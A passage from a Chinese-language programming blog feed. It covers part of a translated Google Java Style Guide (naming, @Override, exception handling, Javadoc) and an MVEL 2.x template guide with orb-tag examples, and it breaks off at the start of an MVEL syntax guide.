request”</td><td>XmlHttpRequest</td><td>XMLHTTPRequest</td></tr><tr><td>“new customer ID”</td><td>newCustomerId</td><td>newCustomerID</td></tr><tr><td>“inner stopwatch”</td><td>innerStopwatch</td><td>innerStopWatch</td></tr><tr><td>“supports IPv6 on iOS?”</td><td>supportsIpv6OnIos</td><td>supportsIPv6OnIOS</td></tr><tr><td>“YouTube importer”</td><td>YouTubeImporter YoutubeImporter^</td><td>无</td></tr></tbody></table><p>加<code>^</code>号处表示可以，但不推荐。</p><blockquote><p><strong>注意</strong>：在英语中，某些带有连字符的单词形式不唯一。例如：<code>nonempty</code>和<code>non-empty</code>都是正确的，因此方法名<code>checkNonempty</code>和<code>checkNonEmpty</code>也都是正确的。</p></blockquote><h2 id="6-编程实践"><a href="#6-编程实践" class="headerlink" title="6 编程实践"></a>6 编程实践</h2><h3 id="6-1-Override：总是使用"><a href="#6-1-Override：总是使用" class="headerlink" title="6.1 @Override：总是使用"></a>6.1 <code>@Override</code>：总是使用</h3><p>只要是合法的方法，就把<code>@Override</code>注解加上。这包括覆盖超类方法的类方法，实现接口方法的类方法。</p><p><strong>例外</strong>：当父方法为<code>@Deprecated</code>时，可以省略<code>@Override</code>。</p><h3 id="6-2-捕获的异常：不能忽视"><a href="#6-2-捕获的异常：不能忽视" class="headerlink" title="6.2 捕获的异常：不能忽视"></a>6.2 捕获的异常：不能忽视</h3><p>除了下面的例子，对捕获的异常不做任何响应是极少的。(典型的响应方式是打印日志，或者如果它被认为是不可能的，则把它当作一个<code>AssertionError</code>重新抛出。)</p><p>如果它确实是不需要在<code>catch</code>块中做任何响应，需要做注释加以说明(如下面的例子)。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">handleNumericResponse</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NumberFormatException</span> ok<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 它不是一个数字，不过没关系，继续</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token function">handleTextResponse</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>例外：在测试中，如果一个捕获的异常被命名为<code>expected</code>，则它可以被不加注释地忽略。下面是一种非常常见的情形，用以确保所测试的方法会抛出一个期望中的异常， 因此在这里就没有必要加注释。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    emptyStack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchElementException</span> expected<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>6.3 静态成员：使用类来调用</p><p>使用类名调用静态的类成员，而不是具体某个对象或表达式。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Foo</span> aFoo <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">;</span><span class="token class-name">Foo</span><span class="token punctuation">.</span><span class="token function">aStaticMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 好</span>aFoo<span class="token punctuation">.</span><span class="token function">aStaticMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 糟</span><span class="token function">somethingThatYieldsAFoo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">aStaticMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 很糟</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>6.4 <code>Finalizers</code>: 禁用</p><p>极少会去重载<code>Object.finalize</code>。</p><blockquote><p><strong>注意</strong>：不要使用<code>finalize</code>。如果你非要使用它，请先仔细阅读和理解<code>Effective Java第7条款</code>：“Avoid Finalizers”，然后不要使用它。</p></blockquote><h2 id="7-Javadoc"><a href="#7-Javadoc" class="headerlink" title="7 Javadoc"></a>7 Javadoc</h2><h3 id="7-1-格式"><a href="#7-1-格式" class="headerlink" title="7.1 格式"></a>7.1 格式</h3><h4 id="7-1-1-一般形式"><a href="#7-1-1-一般形式" class="headerlink" title="7.1.1 一般形式"></a>7.1.1 一般形式</h4><p><code>Javadoc</code>块的基本格式如下所示：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/** * Multiple lines of Javadoc text are written here, * wrapped normally... */</span><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">method</span><span class="token punctuation">(</span><span class="token class-name">String</span> p1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者是以下单行形式：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/** An especially short bit of Javadoc. */</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>基本格式总是可以接受的。当整个<code>Javadoc</code>块能容纳于一行时(且没有标记<code>@XXX</code>)，就可以使用单行形式。</p><h4 id="7-1-2-段落"><a href="#7-1-2-段落" class="headerlink" title="7.1.2 段落"></a>7.1.2 段落</h4><p>空行(只包含最左侧星号的行)会出现在段落之间和<code>Javadoc</code>标记(<code>@XXX</code>)之前(如果有的话)。 除了第一个段落，每个段落第一个单词前都有标签<code>&lt;p&gt;</code>，并且它和第一个单词间没有空格。</p><h4 id="7-1-3-Javadoc标记"><a href="#7-1-3-Javadoc标记" class="headerlink" title="7.1.3 Javadoc标记"></a>7.1.3 Javadoc标记</h4><p>标准的<code>Javadoc</code>标记按以下顺序出现：<code>@param</code>, <code>@return</code>, <code>@throws</code>, <code>@deprecated</code>, 前面这4种标记如果出现，描述都不能为空。 当描述无法在一行中容纳，连续行需要至少再缩进<code>4</code>个空格(<strong>注</strong>：如果你的缩进统一采用采用<code>4</code>个空格，那么这里就应该是<code>8</code>个空格)。</p><h4 id="7-2-摘要片段"><a href="#7-2-摘要片段" class="headerlink" title="7.2 摘要片段"></a>7.2 摘要片段</h4><p>每个类或成员的<code>Javadoc</code>以一个简短的摘要片段开始。这个片段是非常重要的，在某些情况下，它是唯一出现的文本，比如在类和方法索引中。</p><p>这只是一个小片段，可以是一个名词短语或动词短语，但不是一个完整的句子。它不会以<code>A &#123;@code Foo&#125; is a...</code>或者<code>This method returns...</code>开头, 它也不会是一个完整的祈使句，如<code>Save the record.</code>。然而，由于开头大写及被加了标点，它看起来就像是个完整的句子。</p><blockquote><p><strong>注意</strong>：一个常见的错误是把简单的Javadoc写成<code>/** @return the customer ID */</code>，这是不正确的。它应该写成<code>/** Returns the customer ID. */</code>。</p></blockquote><h3 id="7-3-在哪里使用Javadoc"><a href="#7-3-在哪里使用Javadoc" class="headerlink" title="7.3 在哪里使用Javadoc"></a>7.3 在哪里使用Javadoc</h3><p>至少在每个<code>public</code>类及它的每个<code>public</code>和<code>protected</code>成员处使用<code>Javadoc</code>，以下是一些例外：</p><h4 id="7-3-1-例外：不言自明的方法"><a href="#7-3-1-例外：不言自明的方法" class="headerlink" title="7.3.1 例外：不言自明的方法"></a>7.3.1 例外：不言自明的方法</h4><p>对于简单明显的方法如<code>getFoo</code>，<code>Javadoc</code>是可选的(可以不写)。这种情况下除了写<code>Returns the foo</code>，确实也没有什么值得写了。</p><p>单元测试类中的测试方法可能是不言自明的最常见例子了，我们通常可以从这些方法的描述性命名中知道它是干什么的，因此不需要额外的文档说明。</p><blockquote><p><strong>注意</strong>：如果有一些相关信息是需要读者了解的，那么以上的例外不应作为忽视这些信息的理由。例如，对于方法名<code>getCanonicalName</code>，就不应该忽视文档说明，因为读者很可能不知道词语<code>canonical name</code>指的是什么。</p></blockquote><h4 id="7-3-2-例外：重载"><a href="#7-3-2-例外：重载" class="headerlink" title="7.3.2 例外：重载"></a>7.3.2 例外：重载</h4><p>如果一个方法重载了超类中的方法，那么<code>Javadoc</code>并非必需的。</p><h4 id="7-3-3-可选的Javadoc"><a href="#7-3-3-可选的Javadoc" class="headerlink" title="7.3.3 可选的Javadoc"></a>7.3.3 可选的Javadoc</h4><p>对于包外不可见的类和方法，如有需要，也是要使用<code>Javadoc</code>的。如果一个注释是用来定义一个类，方法，字段的整体目的或行为， 那么这个注释应该写成<code>Javadoc</code>，这样更统一更友好。</p><p>原文地址: <a href="http://checkstyle.sourceforge.net/reports/google-java-style-20170228.html">Google Java Style Guide</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Google </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MVEL2.x模板指南</title>
      <link href="/2018/09/19/hou-duan/mvel2.x-mo-ban-zhi-nan/"/>
      <url>/2018/09/19/hou-duan/mvel2.x-mo-ban-zhi-nan/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p><a href="https://github.com/mvel/mvel">MVEL</a>最初作为Mike Brock创建的 Valhalla项目的表达式计算器（<code>expression evaluator</code>）。Valhalla本身是一个早期的类似 Seam 的“开箱即用”的Web 应用框架，而 Valhalla 项目现在处于休眠状态， MVEL则成为一个继续积极发展的项目。相比最初的<code>OGNL</code>、<code>JEXL</code>和<code>JUEL</code>等项目，而它具有远超它们的性能、功能和易用性 - 特别是集成方面。它不会尝试另一种JVM语言，而是着重解决嵌入式脚本的问题。关于MVEL的语法请参考<a href="http://blinkfox.com/mvel-2-xyu-fa-zhi-nan/">MVEL 2.x语法指南</a></p></blockquote><p>MVEL 2.0提供了一个新的，更强大的，统一的模板引擎，汇集了1.2中引入的许多模板概念。 不幸的是，1.2中的模板引擎的架构不足以用于常规维护，并且决定从头开始完全重写模板引擎。</p><h2 id="一、MVEL-2-0基本模板"><a href="#一、MVEL-2-0基本模板" class="headerlink" title="一、MVEL 2.0基本模板"></a>一、MVEL 2.0基本模板</h2><p>MVEL模板由纯文本文档中的<code>orb-tags</code>组成。 Orb标记表示引擎将在运行时计算模板的动态元素。</p><p>如果你熟悉FreeMarker，这种类型的语法将不会完全陌生。</p><h3 id="1-一个简单的模板"><a href="#1-一个简单的模板" class="headerlink" title="1. 一个简单的模板"></a>1. 一个简单的模板</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Hello</span><span class="token punctuation">,</span> @<span class="token punctuation">&#123;</span>person<span class="token punctuation">.</span><span class="token function">getSex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token char">'F'</span> <span class="token operator">?</span> <span class="token char">'Ms.'</span> <span class="token operator">:</span> <span class="token char">'Mr.'</span><span class="token punctuation">&#125;</span> @<span class="token punctuation">&#123;</span>person<span class="token punctuation">.</span>name<span class="token punctuation">&#125;</span><span class="token class-name">This</span> e<span class="token operator">-</span>mail is <span class="token keyword">to</span> <span class="token namespace">thank</span> you <span class="token keyword">for</span> your interest in <span class="token constant">MVEL</span> <span class="token class-name">Templates</span> <span class="token number">2.0</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>此模板展示了可以在简单文本中嵌入表达式。当计算结果时，输出可能如下所示：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Hello</span><span class="token punctuation">,</span> <span class="token class-name">Ms<span class="token punctuation">.</span> Sarah</span> <span class="token class-name">Peterson</span><span class="token class-name">This</span> e<span class="token operator">-</span>mail is <span class="token keyword">to</span> <span class="token namespace">thank</span> you <span class="token keyword">for</span> your interest in <span class="token constant">MVEL</span> <span class="token class-name">Templates</span> <span class="token number">2.0</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="2-转义-符号"><a href="#2-转义-符号" class="headerlink" title="2. 转义@符号"></a>2. 转义@符号</h3><p>当然，由于@符号用于表示<code>orb-tag</code>的开头，因此您可能需要对其进行转义，以防止其被编译器处理。幸运的是，只有一种情况，即当你实际上需要输出‘@{‘字符串在您的模板上时。</p><p>由于编译器需要@和{组合触发orb识别，你可以自由使用@符号而不转义它们。例如：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Email</span> any questions <span class="token keyword">to</span><span class="token operator">:</span> foo<span class="token annotation punctuation">@bar.com</span>@<span class="token punctuation">&#123;</span>date<span class="token punctuation">&#125;</span><span class="token annotation punctuation">@include</span><span class="token punctuation">&#123;</span>'disclaimer<span class="token punctuation">.</span>html'<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>但是在你需要一个@符号挨着一个orb-tag的情况下，你需要通过重复它两次来避免它：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">@<span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span>@@@<span class="token punctuation">&#123;</span>domain<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这是两个@转义一个符号，第三个@是标签的开始。如果你感觉这看起来太乱，你可以使用替代方法，即使用表达式标签，如下所示：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">@<span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span>@<span class="token punctuation">&#123;</span><span class="token char">'@'</span><span class="token punctuation">&#125;</span>@<span class="token punctuation">&#123;</span>domain<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="二、MVEL-2-0-Orb标签"><a href="#二、MVEL-2-0-Orb标签" class="headerlink" title="二、MVEL 2.0 Orb标签"></a>二、MVEL 2.0 Orb标签</h2><p>本文包含了MVEL 2.0模板引擎中所有开箱即用的orb标签。</p><h3 id="1-Orb表达式"><a href="#1-Orb表达式" class="headerlink" title="1. @{} Orb表达式"></a>1. @{} Orb表达式</h3><p>@{}表达式是orb-tag的最基本形式。它包含一个对字符串求值的值表达式，并附加到输出模板中。例如：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Hello</span><span class="token punctuation">,</span> my name is @<span class="token punctuation">&#123;</span>person<span class="token punctuation">.</span>name<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-code-静默代码标签"><a href="#2-code-静默代码标签" class="headerlink" title="2. @code{} 静默代码标签"></a>2. @code{} 静默代码标签</h3><p>静默代码标记允许您在模板中执行MVEL表达式代码。它不返回值，并且不以任何方式影响模板的格式。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@code</span><span class="token punctuation">&#123;</span>age <span class="token operator">=</span> <span class="token number">23</span><span class="token punctuation">;</span> name <span class="token operator">=</span> '<span class="token class-name">John</span> <span class="token class-name">Doe</span>'<span class="token punctuation">&#125;</span>@<span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span> is @<span class="token punctuation">&#123;</span>age<span class="token punctuation">&#125;</span> years old<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>该模板将计算出：John Doe is 23 years old。</p><h3 id="3-if-else-控制流标签"><a href="#3-if-else-控制流标签" class="headerlink" title="3. @if{}@else{} 控制流标签"></a>3. @if{}@else{} 控制流标签</h3><p>@if{}和@else{}标签在MVEL模板中提供了完全的if-then-else功能。 例如：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@if</span><span class="token punctuation">&#123;</span>foo <span class="token operator">!=</span> bar<span class="token punctuation">&#125;</span>   <span class="token class-name">Foo</span> not a bar<span class="token operator">!</span><span class="token annotation punctuation">@else</span><span class="token punctuation">&#123;</span>bar <span class="token operator">!=</span> cat<span class="token punctuation">&#125;</span>   <span class="token class-name">Bar</span> is not a cat<span class="token operator">!</span><span class="token annotation punctuation">@else</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>   <span class="token class-name">Foo</span> may be a <span class="token class-name">Bar</span> or a <span class="token class-name">Cat</span><span class="token operator">!</span><span class="token annotation punctuation">@end</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>MVEL模板中的所有块必须用<code>@end&#123;&#125;</code>标签来终止，除非是<code>if-then-else</code>结构，其中<code>@else&#123;&#125;</code>标记表示前一个控制语句的终止。</p><h3 id="4-foreach-Foreach迭代"><a href="#4-foreach-Foreach迭代" class="headerlink" title="4. @foreach{} Foreach迭代"></a>4. @foreach{} Foreach迭代</h3><p>foreach标签允许您在模板中迭代集合或数组。 注意：foreach的语法已经在MVEL模板2.0中改变，以使用foreach符号来标记MVEL语言本身的符号。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@foreach</span><span class="token punctuation">&#123;</span>item <span class="token operator">:</span> products<span class="token punctuation">&#125;</span>  <span class="token operator">-</span> @<span class="token punctuation">&#123;</span>item<span class="token punctuation">.</span>serialNumber<span class="token punctuation">&#125;</span><span class="token annotation punctuation">@end</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>MVEL 2.0要求您指定一个迭代变量。虽然MVEL 1.2假设您没有指定别名，但由于对该默认操作有一些抱怨，因此已被删除。</p><h3 id="5-多重迭代"><a href="#5-多重迭代" class="headerlink" title="5. 多重迭代"></a>5. 多重迭代</h3><p>您可以通过逗号分隔迭代在一个foreach循环中一次性迭代多个集合：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@foreach</span><span class="token punctuation">&#123;</span>var1 <span class="token operator">:</span> set1<span class="token punctuation">,</span> var2 <span class="token operator">:</span> set2<span class="token punctuation">&#125;</span>  @<span class="token punctuation">&#123;</span>var1<span class="token punctuation">&#125;</span><span class="token operator">-</span>@<span class="token punctuation">&#123;</span>var2<span class="token punctuation">&#125;</span><span class="token annotation punctuation">@end</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="6-分隔"><a href="#6-分隔" class="headerlink" title="6. 分隔"></a>6. 分隔</h3><p>你可以通过在<code>@end&#123;&#125;</code>标签中指定迭代器的文本分隔符。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@foreach</span><span class="token punctuation">&#123;</span>item <span class="token operator">:</span> people<span class="token punctuation">&#125;</span>@<span class="token punctuation">&#123;</span>item<span class="token punctuation">.</span>name<span class="token punctuation">&#125;</span><span class="token annotation punctuation">@end</span><span class="token punctuation">&#123;</span><span class="token char">', '</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将返回类似这样的结果：John, Mary, Joseph。</p><h3 id="7-include-包含模板文件"><a href="#7-include-包含模板文件" class="headerlink" title="7. @include{} 包含模板文件"></a>7. @include{} 包含模板文件</h3><p>您可以使用此标签将模板文件包含到MVEL模板中。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@include</span><span class="token punctuation">&#123;</span>'header<span class="token punctuation">.</span>mv'<span class="token punctuation">&#125;</span><span class="token class-name">This</span> is a test template<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>您还可以通过在模板名称后面添加分号在include标签内执行MVEL表达式：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@include</span> <span class="token punctuation">&#123;</span>'header<span class="token punctuation">.</span>mv'<span class="token punctuation">;</span> title <span class="token operator">=</span>'<span class="token class-name">Foo</span> <span class="token class-name">Title</span>'<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="8-includeNamed-包括一个命名模板"><a href="#8-includeNamed-包括一个命名模板" class="headerlink" title="8. @includeNamed{} 包括一个命名模板"></a>8. @includeNamed{} 包括一个命名模板</h3><p>命名模板是已经通过TemplateRegistry预先编译并传递到运行时的模板，或者已在模板本身中声明的模板。 您只需添加：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@includeNamed</span> <span class="token punctuation">&#123;</span>'fooTemplate'<span class="token punctuation">&#125;</span><span class="token annotation punctuation">@includeNamed</span> <span class="token punctuation">&#123;</span>'footerTemplate'，showSomething <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>你也可以在<code>@includeNamed&#123;&#125;</code>标签中执行MVEL代码，就像<code>@include&#123;&#125;</code>标签一样。</p><h3 id="9-declare-声明一个模板"><a href="#9-declare-声明一个模板" class="headerlink" title="9. @declare{} 声明一个模板"></a>9. @declare{} 声明一个模板</h3><p>除了包括外部文件的外部模板，并以编程方式传递它们之外，您还可以从模板中声明模板。 它允许你做这样的事情：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@declare</span><span class="token punctuation">&#123;</span>'personTemplate'<span class="token punctuation">&#125;</span> <span class="token class-name">Name</span><span class="token operator">:</span> @<span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span> <span class="token class-name">Age</span><span class="token operator">:</span>  @<span class="token punctuation">&#123;</span>age<span class="token punctuation">&#125;</span><span class="token annotation punctuation">@end</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token annotation punctuation">@includeNamed</span><span class="token punctuation">&#123;</span>'personTemplate'<span class="token punctuation">;</span> name<span class="token operator">=</span>'<span class="token class-name">John</span> <span class="token class-name">Doe</span>'<span class="token punctuation">;</span> age<span class="token operator">=</span><span class="token number">22</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="10-comment-注释标签"><a href="#10-comment-注释标签" class="headerlink" title="10. @comment{} 注释标签"></a>10. @comment{} 注释标签</h3><p>注释标签允许您向模板添加不可见的注释。 例如：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@comment</span><span class="token punctuation">&#123;</span>  <span class="token class-name">This</span> is a comment<span class="token punctuation">&#125;</span><span class="token class-name">Hello</span><span class="token operator">:</span> @<span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span><span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、MVEL-2-0模板集成"><a href="#三、MVEL-2-0模板集成" class="headerlink" title="三、MVEL 2.0模板集成"></a>三、MVEL 2.0模板集成</h2><p>使用MVEL模板是直接和容易的。 与常规MVEL表达式一样，它们可以解释性地执行，或者预编译并重新用于更快的评估。</p><h3 id="1-org-mvel-templates-TemplateRuntime-类"><a href="#1-org-mvel-templates-TemplateRuntime-类" class="headerlink" title="1. org.mvel.templates.TemplateRuntime 类"></a>1. org.mvel.templates.TemplateRuntime 类</h3><p><code>TemplateRuntime</code>类是模板引擎的中心。您可以通过<code>eval()</code>方法将要计算的模板传递给模板引擎。</p><p>一般来说，模板引擎遵循上下文和变量绑定的所有相同规则，使用一组重载的<code>eval()</code>方法。</p><p>下面是一个解析模板的简单例子：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> template <span class="token operator">=</span> <span class="token string">"Hello, my name is @&#123;name.toUpperCase()&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Map</span> vars <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>vars<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">,</span> <span class="token string">"Michael"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> output <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token class-name">TemplateRuntime</span><span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span>template<span class="token punctuation">,</span> vars<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在执行结束时，“output”变量将包含字符串：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Hello</span><span class="token punctuation">,</span> my name is <span class="token constant">MICHAEL</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-org-mvel-templates-TemplateCompiler类"><a href="#2-org-mvel-templates-TemplateCompiler类" class="headerlink" title="2. org.mvel.templates.TemplateCompiler类"></a>2. org.mvel.templates.TemplateCompiler类</h3><p><code>TemplateCompiler</code>类允许预先编译模板。</p><p>当编译模板时，将生成一个紧凑，可重用的评估树，可以快速用于计算模板。它直接使用：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> template <span class="token operator">=</span> <span class="token string">"1 + 1 = @&#123;1+1&#125;"</span><span class="token punctuation">;</span><span class="token comment">// 编译模板</span><span class="token class-name">CompiledTemplate</span> compiled <span class="token operator">=</span> <span class="token class-name">TemplateCompiler</span><span class="token punctuation">.</span><span class="token function">compileTemplate</span><span class="token punctuation">(</span>template<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 执行模板</span><span class="token class-name">String</span> output <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token class-name">TemplateRuntime</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span>compiled<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在执行结束时，“output”变量将包含字符串：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">1</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> MVEL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MVEL 2.x语法指南</title>
      <link href="/2018/09/18/hou-duan/mvel2.x-yu-fa-zhi-nan/"/>
      <url>/2018/09/18/hou-duan/mvel2.x-yu-fa-zhi-nan/</url>
      
        <content type="html"><![CDATA[<h1 id="MVEL-2-x语法指南"><a href="#MVEL-2-x语法指南" class="headerlink" title="MVEL 2.x语法指南"></a>MVEL 2.x语法指南</h1><p><a href="https://github.com/mvel/mvel">MVEL</a>全称为：MVFLEX Expression Language，是用来计算Java语法所编写的表达式值的表达式语言。MVEL的语法很大程度上受到Java语法的启发，但为了使表达式语法更高效,还是有一些基本差异，例如可以像正则表达式一样直接支持集合、数组和字符串匹配的运算。</p><p>除了表达式语言之外，MVEL还用作配置和字符串构造的模板语言。这里还有一个关于<a href="https%EF%BC%9A//en.wikipedia.org/wiki/MVEL">MVEL</a>介绍信息的wiki页面是：https：//en.wikipedia.org/wiki/MVEL。</p><p>MVEL 2.x表达式主要包括以下特性：</p><ul><li>属性表达式</li><li>布尔表达式</li><li>方法调用</li><li>变量赋值</li><li>函数定义</li></ul><h2 id="一、基本语法"><a href="#一、基本语法" class="headerlink" title="一、基本语法"></a>一、基本语法</h2><p>MVEL是基于Java语法的表达式语言，具有特定于MVEL的一些明显差异。与Java不同，MVEL是动态类型化（可选类型化），意味着在源代码中不需要类型限定。</p><p>MVEL可以方便的集成到产品中使用。Maven的集成方式如下：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.mvel<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>mvel2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.2.8.Final<span class="token tag"><span class="token tag"><span class="token 